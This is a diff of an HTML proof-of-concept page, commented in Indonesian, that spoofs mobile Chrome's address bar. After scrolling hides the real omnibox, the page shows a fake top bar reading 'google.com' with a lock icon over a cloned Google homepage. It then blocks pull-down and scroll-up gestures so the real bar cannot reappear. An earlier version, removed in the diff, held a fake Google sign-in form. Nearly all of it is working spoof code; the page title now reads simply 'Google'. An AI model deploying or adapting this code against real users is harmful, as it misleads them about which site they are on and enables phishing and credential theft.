@@ -1,37 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Security Research Proof of Concept - Omnibox Lock & UI Spoofing</title>
+<title>Google</title>
 <style>
     :root {
         --bg-color: #202124;
-        --text-color: #e8eaed;
+        --text-color: #bdc1c6;
+        --input-bg: #303134;
+        --border-color: #5f6368;
+        --google-blue: #8ab4f8;
     }
 
     * {
         box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
     }
 
     body {
         margin: 0;
         padding: 0;
-        height: 4000px; /* Panjang halaman untuk memicu auto-hide omnibox */
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        height: 4500px; /* Panjang halaman untuk memicu auto-hide omnibox asli */
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         background-color: var(--bg-color);
         color: var(--text-color);
+        overflow-x: hidden;
     }
 
     .instructions {
-        padding: 40px 20px;
+        padding: 60px 20px;
         text-align: center;
-        max-width: 600px;
+        max-width: 500px;
         margin: 0 auto;
     }
 
     .instructions h1 {
-        font-size: 20px;
+        font-size: 18px;
         color: #f28b82;
         margin-bottom: 10px;
     }
@@ -42,83 +47,179 @@
         line-height: 1.5;
     }
 
-    /* Fake Omnibox Overlay menggunakan gambar asli screenshot (22261.jpg) */
-    #fakeOmnibox {
+    /* === FAKE CHROME TOP BAR & OMNIBOX UI === */
+    #fakeTopChrome {
         position: fixed;
         top: 0;
         left: 0;
         width: 100%;
-        height: 72px; /* Disesuaikan dengan proporsi bagian atas browser pada gambar */
-        overflow: hidden;
+        background: #171717;
         display: none;
+        flex-direction: column;
         z-index: 999999;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+        box-shadow: 0 2px 8px rgba(0,0,0,0.6);
+        border-bottom: 1px solid #3c4043;
     }
 
-    #fakeOmnibox img {
-        width: 100%;
-        display: block;
-        /* Memposisikan gambar secara presisi hanya mengambil bagian atas (bilah alamat & status bar) */
-        object-fit: cover;
-        object-position: top;
-        margin-top: 0px;
+    .fake-browser-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 8px 12px;
+        height: 52px;
     }
 
-    /* Halaman Target/Phishing Simulasi di bawahnya */
-    #secureView {
+    .fake-omnibox {
+        flex: 1;
+        background: #292a2d;
+        height: 38px;
+        border-radius: 19px;
+        display: flex;
+        align-items: center;
+        padding: 0 16px;
+        font-size: 14px;
+        color: #e8eaed;
+        gap: 10px;
+        border: 1px solid transparent;
+    }
+
+    .fake-omnibox span {
+        overflow: hidden;
+        white-space: nowrap;
+        text-overflow: ellipsis;
+    }
+
+    .lock-icon {
+        color: #8ab4f8;
+        font-size: 12px;
+    }
+
+    .browser-actions {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+        padding-left: 12px;
+        color: #e8eaed;
+        font-size: 16px;
+    }
+
+    .tab-counter {
+        border: 2px solid #e8eaed;
+        border-radius: 4px;
+        width: 18px;
+        height: 18px;
+        font-size: 11px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: bold;
+    }
+
+    /* === GOOGLE SEARCH HOMEPAGE UI LAYOUT === */
+    #googleHomepageView {
         position: absolute;
         left: 0;
         width: 100%;
         display: none;
-        padding-top: 90px;
         background: #202124;
         min-height: 100vh;
         z-index: 99998;
+        padding-top: 10px;
     }
 
-    .card {
-        width: 90%;
-        max-width: 400px;
-        margin: 40px auto;
-        padding: 24px;
-        background: #292a2d;
-        border-radius: 8px;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-        border: 1px solid #3c4043;
-        text-align: center;
+    .google-nav-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 12px 16px;
+        font-size: 13px;
     }
 
-    .card h2 {
-        font-size: 18px;
-        margin-bottom: 20px;
-        color: #e8eaed;
+    .google-nav-header .left-links, .google-nav-header .right-links {
+        display: flex;
+        align-items: center;
+        gap: 16px;
     }
 
-    .input-field {
-        width: 100%;
-        padding: 12px 14px;
-        margin: 8px 0 16px 0;
-        background: #202124;
-        border: 1px solid #5f6368;
-        color: white;
-        border-radius: 4px;
-        font-size: 16px;
-        outline: none;
+    .google-nav-header a {
+        color: #bdc1c6;
+        text-decoration: none;
     }
 
-    .input-field:focus {
-        border-color: #8ab4f8;
-    }
-
-    .btn-submit {
-        width: 100%;
-        padding: 12px;
+    .profile-avatar {
+        width: 32px;
+        height: 32px;
         background: #8ab4f8;
         color: #202124;
-        border: none;
-        border-radius: 4px;
-        font-size: 16px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
         font-weight: bold;
+        font-size: 14px;
+    }
+
+    .google-main-content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 80px;
+        padding: 0 16px;
+    }
+
+    .google-logo {
+        font-size: 64px;
+        font-weight: 500;
+        letter-spacing: -2px;
+        margin-bottom: 24px;
+        user-select: none;
+    }
+
+    .google-logo span:nth-child(1) { color: #4285f4; }
+    .google-logo span:nth-child(2) { color: #ea4335; }
+    .google-logo span:nth-child(3) { color: #fbbc05; }
+    .google-logo span:nth-child(4) { color: #4285f4; }
+    .google-logo span:nth-child(5) { color: #34a853; }
+    .google-logo span:nth-child(6) { color: #ea4335; }
+
+    .search-box-container {
+        width: 100%;
+        max-width: 584px;
+        background: #303134;
+        border: 1px solid #5f6368;
+        border-radius: 28px;
+        display: flex;
+        align-items: center;
+        padding: 10px 16px;
+        gap: 14px;
+        box-shadow: 0 1px 6px rgba(32,33,36,0.28);
+    }
+
+    .search-box-container svg {
+        width: 20px;
+        height: 20px;
+        fill: #9aa0a6;
+    }
+
+    .search-input {
+        flex: 1;
+        background: transparent;
+        border: none;
+        outline: none;
+        color: #e8eaed;
+        font-size: 16px;
+    }
+
+    .search-tools-icons {
+        display: flex;
+        gap: 16px;
+        align-items: center;
+    }
+
+    .search-tools-icons svg {
+        width: 22px;
+        height: 22px;
+        fill: #8ab4f8;
         cursor: pointer;
     }
 
@@ -127,107 +228,140 @@
         bottom: 20px;
         left: 50%;
         transform: translateX(-50%);
-        background: rgba(0,0,0,0.85);
+        background: rgba(32,33,36,0.92);
         color: #e8eaed;
         padding: 8px 16px;
         border-radius: 20px;
         font-size: 12px;
-        z-index: 99999;
+        z-index: 999999;
         pointer-events: none;
         border: 1px solid #5f6368;
-        transition: opacity 0.3s ease;
     }
 </style>
 </head>
 <body>
 
 <div class="instructions" id="instructionBox">
-    <h1>Security Analysis Test - Image-based Omnibox Spoof</h1>
-    <p>1. Scroll down smoothly until the browser address bar automatically hides.<br>
-       2. Stop scrolling briefly to let the script lock scroll states.<br>
-       3. The original UI is replaced seamlessly by the target screenshot asset.</p>
+    <h1>Full UI Chaining Simulation</h1>
+    <p>1. Gulir ke bawah secara perlahan hingga bilah alamat asli Chrome tersembunyi (auto-hide).<br>
+       2. Jeda sejenak untuk memicu rantai penguncian.<br>
+       3. Tampilan UI Google Search dan Chrome Top Bar akan dikunci secara penuh.</p>
 </div>
 
-<!-- Fake Omnibox Overlay menggunakan gambar 22261.jpg -->
-<div id="fakeOmnibox">
-    <img src="22261.jpg" alt="Fake Omnibox">
-</div>
-
-<!-- Tampilan Simulasi Phishing/Login -->
-<div id="secureView">
-    <div class="card">
-        <h2>Sign in with Google</h2>
-        <input type="text" class="input-field" value="victim@gmail.com">
-        <input type="password" class="input-field" value="secret_password">
-        <button class="btn-submit">Continue</button>
+<!-- Fake Chrome Top Bar & Omnibox (Menyerupai Chrome Mobile Dark Mode) -->
+<div id="fakeTopChrome">
+    <div class="fake-browser-header">
+        <div class="fake-omnibox">
+            <span class="lock-icon">🔒</span>
+            <span>google.com</span>
+        </div>
+        <div class="browser-actions">
+            <span>⌂</span>
+            <div class="tab-counter">2</div>
+            <span>⋮</span>
+        </div>
     </div>
 </div>
 
-<div id="statusIndicator">Status: Waiting for scroll action...</div>
+<!-- Google Search Homepage UI Layout -->
+<div id="googleHomepageView">
+    <div class="google-nav-header">
+        <div class="left-links">
+            <a href="#">Gmail</a>
+            <a href="#">Gambar</a>
+        </div>
+        <div class="right-links">
+            <svg focusable="false" viewBox="0 0 24 24" width="24" height="24" fill="#bdc1c6"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"></path></svg>
+            <div class="profile-avatar">A</div>
+        </div>
+    </div>
+
+    <div class="google-main-content">
+        <div class="google-logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+        
+        <div class="search-box-container">
+            <svg focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
+            <input type="text" class="search-input" placeholder="Telusuri Google atau ketik URL">
+            <div class="search-tools-icons">
+                <!-- Icon Microphone -->
+                <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm-1-9c0-.55.45-1 1-1s1 .45 1 1v6c0 .55-.45 1-1 1s-1-.45-1-1V5zm6 6c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"></path></svg>
+                <!-- Icon Google Lens -->
+                <svg viewBox="0 0 24 24"><path d="M12 15c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zM9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"></path></svg>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="statusIndicator">Status: Menunggu aksi scroll...</div>
 
 <script>
-    let isLocked = false;
-    let scrollTriggered = false;
+    let isChainingActive = false;
+    let scrollCounter = 0;
 
-    // Deteksi scroll untuk memicu otomatisasi setelah omnibox asli tersembunyi
+    // Chaining Tahap 1: Deteksi scroll berkelanjutan untuk memastikan omnibox asli tersembunyi
     window.addEventListener('scroll', function() {
-        if (window.scrollY > 150 && !scrollTriggered) {
-            scrollTriggered = true;
-            document.getElementById('statusIndicator').innerText = "Status: Scroll detected. Locking UI bounds...";
-            
-            // Aktivasi penguncian instan setelah jeda singkat
-            setTimeout(activateSpoofingLock, 3500);
-        }
-    });
+        if (isChainingActive) return;
 
-    function activateSpoofingLock() {
-        isLocked = true;
-        
+        if (window.scrollY > 180) {
+            scrollCounter++;
+            if (scrollCounter > 3) {
+                document.getElementById('statusIndicator').innerText = "Status: Ambang batas tercapai, mengunci UI...";
+                setTimeout(triggerFullUIChaining, 3000);
+                isChainingActive = true;
+            }
+        }
+    }, { passive: true });
+
+    // Chaining Tahap 2: Sinkronisasi dan Eksekusi Tampilan Overlay Layout
+    function triggerFullUIChaining() {
         let currentY = window.scrollY;
-        let secureView = document.getElementById("secureView");
-        let fakeOmnibox = document.getElementById("fakeOmnibox");
+        let googleView = document.getElementById("googleHomepageView");
+        let fakeTopChrome = document.getElementById("fakeTopChrome");
         let indicator = document.getElementById("statusIndicator");
         let instructions = document.getElementById("instructionBox");
 
         // Sembunyikan instruksi panduan
         instructions.style.display = 'none';
 
-        // Sinkronisasi posisi elemen agar mulus tanpa layout shift
-        secureView.style.top = currentY + "px";
-        secureView.style.display = "block";
-        fakeOmnibox.style.display = "block";
+        // Terapkan posisi mutlak secara sinkron untuk menghindari pergeseran layout (layout shift)
+        googleView.style.top = currentY + "px";
+        googleView.style.display = "block";
+        fakeTopChrome.style.display = "flex";
 
-        indicator.innerText = "Status: Image-based Omnibox Spoof Active!";
+        indicator.innerText = "Status: Full Chaining Aktif - UI Terkunci!";
         indicator.style.borderColor = "#f28b82";
 
-        // Paksa posisi scroll agar tidak bergeser kembali
+        // Kunci posisi scroll agar tidak bergeser kembali ke atas
         window.scrollTo({
             top: currentY,
             behavior: 'instant'
         });
     }
 
-    // Pemblokiran gestur tarik ke bawah (Pull-to-refresh / Show Omnibox)
-    let startY = 0;
+    // Chaining Tahap 3: Pencegatan Sentuhan Agresif untuk Memblokir Gestur Tarik ke Bawah (Pull-to-Reveal)
+    let touchStartY = 0;
 
     document.addEventListener("touchstart", function(e) {
-        startY = e.touches[0].clientY;
+        touchStartY = e.touches[0].clientY;
     }, { passive: false });
 
     document.addEventListener("touchmove", function(e) {
-        if (!isLocked) return;
+        if (!isChainingActive) return;
 
-        let currentY = e.touches[0].clientY;
-        let deltaY = currentY - startY;
+        let currentTouchY = e.touches[0].clientY;
+        let deltaY = currentTouchY - touchStartY;
 
-        // Blokir jika pengguna mencoba menarik layar ke bawah untuk memunculkan omnibox asli
+        // Jika pengguna mencoba menarik layar ke bawah untuk memunculkan kembali bilah alamat asli
         if (deltaY > 0) {
             e.preventDefault();
         }
     }, { passive: false });
 
+    // Kompatibilitas wheel untuk mode emulasi desktop
     document.addEventListener("wheel", function(e) {
-        if (!isLocked) return;
+        if (!isChainingActive) return;
         if (e.deltaY < 0) {
             e.preventDefault();
         }
